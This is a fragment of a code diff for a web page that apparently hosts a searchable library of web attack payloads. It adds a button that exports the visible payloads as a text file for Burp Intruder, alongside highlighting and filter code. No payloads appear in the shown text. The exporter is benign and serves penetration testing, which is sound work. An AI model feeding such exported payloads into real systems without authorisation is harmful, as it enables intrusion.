   s = s.replace(/(&lt;\?php|\?&gt;|&lt;%=?|%&gt;)/g,'<span class="tok-tag">$1</span>');
   s = s.replace(/(&lt;\/?[a-zA-Z][\w-]*&gt;?)/g, m => '<span class="tok-tag">'+m+'</span>');
   s = s.replace(/(\$_?[A-Za-z_]\w*)/g,'<span class="tok-var">$1</span>');
@@ -273,6 +864,41 @@ function applyFilter(q){
     empty.textContent='No payloads match "'+q+'"';
   }else if(empty){empty.remove();}
 }
+
+// --- download for Intruder ---------------------------------------------
+// Exports ONLY the currently visible payloads (respects the search filter).
+// One payload per line — paste directly into Burp Intruder: Payloads > Simple list > Paste.
+document.getElementById('dlBtn').onclick=()=>{
+  const lines=[];
+  document.querySelectorAll('section.cat').forEach(sec=>{
+    if(sec.style.display==='none') return;
+    const cat=sec.dataset.cat;
+    const inCat=[];
+    sec.querySelectorAll('.card').forEach(card=>{
+      if(card.style.display==='none') return;
+      const pre=card.querySelector('pre.code');
+      if(pre) inCat.push(pre.textContent);
+    });
+    if(inCat.length){
+      lines.push('# '+cat);
+      inCat.forEach(p=>lines.push(p));
+      lines.push('');
+    }
+  });
+
+  if(!lines.length){ toast('Nothing to download'); return; }
+
+  const blob=new Blob([lines.join('\n')],{type:'text/plain;charset=utf-8'});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement('a');
+  a.href=url;
+  a.download='payloads-intruder.txt';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(()=>URL.revokeObjectURL(url),1500);
+  toast('Downloaded '+ (lines.length) +' lines');
+};
 
 // --- mobile menu --------------------------------------------------------
 const sidebar=document.getElementById('sidebar'),scrim=document.getElementById('scrim');
